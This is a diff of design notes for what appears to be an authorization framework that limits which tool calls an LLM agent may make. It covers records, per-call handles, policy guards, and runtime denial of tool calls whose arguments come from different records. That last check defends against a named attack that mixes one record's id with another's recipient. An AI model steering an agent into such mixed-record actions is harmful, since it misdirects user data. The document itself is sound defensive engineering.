 - **Privileged guards bridge policy and practice.** They let you say "I know this is generally blocked, but this specific case is authorized" — without weakening the general rule.
 - **`locked: true` is the escape hatch.** When a constraint must be absolute, lock the policy. No guard, no matter how privileged, can override it.
 - **Records are the trust boundary.** `facts` fields carry authorization-grade proof. `data` fields don't. The record author decides — auditable and explicit.
-- **Display projections control disclosure.** `display` on a record determines what the LLM sees: bare, ref (value + handle), masked (preview + handle), handle-only, or omitted. Named modes let one record serve different agents.
-- **Handles are per-call ephemeral.** Each `@claude` invocation mints fresh handle strings via projection; they are not portable across calls. Cross-phase identity flows through the underlying values plus their `factsources` metadata, traveling via shelves and the `known` bucket. The proof claims registry is value-keyed, not handle-string-keyed. `ref` display mode gives the LLM both the readable value and a (per-call) handle. Worker returns use the `handle` field type to enforce that fact-bearing values cross phase boundaries as projection-minted handles.
+- **Read projections control disclosure.** `read` on a record determines what the LLM sees: bare, value (value + handle), masked (preview + handle), handle-only, or omitted. Named modes let one record serve different agents.
+- **Handles are per-call ephemeral.** Each `@claude` invocation mints fresh handle strings via projection; they are not portable across calls. Cross-phase identity flows through the underlying values plus their `factsources` metadata, traveling via shelves and `known` values. The proof claims registry is value-keyed, not handle-string-keyed. Shelf projection caches store handle-free role projection plans keyed by `.mx.key` and mint fresh handles at read time. `value` read mode gives the LLM both the readable value and a per-call handle. Worker returns use the `handle` field type to enforce that fact-bearing values cross phase boundaries as projection-minted handles.
 - **The boundary is narrowed.** Handle resolution is per-call (bridge mint table only). The builder auto-upgrades `known` values to `resolved` when a value-keyed match exists in the proof claims registry — that's the cross-phase reconciliation path. `resolved` accepts handle strings minted in the dispatching call's own scope OR fact-bearing values passed directly from orchestrator code (the runtime walks the value's factsources to mint a fresh handle). Bare literals and masked previews are rejected. There is no longer a "tolerance band" for accepting any emitted form in the same session.
 - **Bucketed intent has three buckets, all uniform.** `resolved`, `known`, and `allow` work as top-level keys to `@policy.build`. Each bucket maps to a different validation path (factsource resolution, task-text verification, no-check). `allow: { tool: true }` authorizes a tool unconditionally regardless of whether its input record declares `facts:`. The bucketed shape is the canonical planner-emitter form; the lower-level flat shape is also accepted for programmatic construction. Mixing the two in a single intent is a hard error, not a silent drop.
-- **Two surfaces for reading shelf state.** Orchestrator code uses `@shelf.read(@<shelf>.<slot>)` to read a slot's full structured value (labels and factsources intact). LLM prompt templates use `@fyi.shelf.<alias>` to interpolate slot contents at template-render time, scoped by the box's read access. The runtime's auto-injected `<shelf_notes>` lists slot SCHEMA, not slot CONTENTS — so a worker that needs slot values must either receive them via prompt variable (orchestrator pre-read) or via template interpolation inside the box scope. The pre-read pattern is cleaner for dispatcher code: prompt assembly stays in one place.
+- **Two surfaces for reading shelf state.** Orchestrator code uses `@shelf.read(@<shelf>.<slot>)` to read a slot's full structured value (labels and factsources intact). LLM prompt templates use `@fyi.shelf.<alias>` to interpolate slot contents at template-render time, scoped by the box's read access. Wildcard shelf slots use the same surfaces, including `@state.<record_type>` and `@state.*` box scopes. The runtime's auto-injected `<shelf_notes>` lists slot SCHEMA, not slot CONTENTS — so a worker that needs slot values must either receive them via prompt variable (orchestrator pre-read) or via template interpolation inside the box scope. The pre-read pattern is cleaner for dispatcher code: prompt assembly stays in one place.
 - **Box shelf scope can be a value.** `box { shelf: @scopeValue }` accepts a regular variable holding `{read: [...], write: [...]}` arrays of slot refs. This lets framework code construct shelf scopes dynamically without parser-level magic. Aliases default to the slot's declared name; `as <alias>` is optional cosmetic renaming for the rare case where a role-based name is wanted.
 - **Wrapper exes can catch their own policy denials** via `when [denied => ..., * => ...]`. The runtime routes the denial to the `denied =>` arm so the wrapper can fall back to a debiased path (e.g. structured re-extraction, escalation). Used by the advice gate pattern in §6/§7. Block bodies with `let` bindings work — the runtime catches denials regardless of body shape.
 - **`correlate: true` on the input record is structurally enforced.** A write tool whose input record declares multiple `facts:` fields has its dispatches checked at runtime — every fact arg's `factsources` must point to the same source record instance. Cross-record dispatches are denied with `Rule 'correlate-control-args'`. Multi-fact records default to `correlate: true`; single-fact records default to `false`. Defends the canonical "mix one record's id with another record's recipient" attack class.
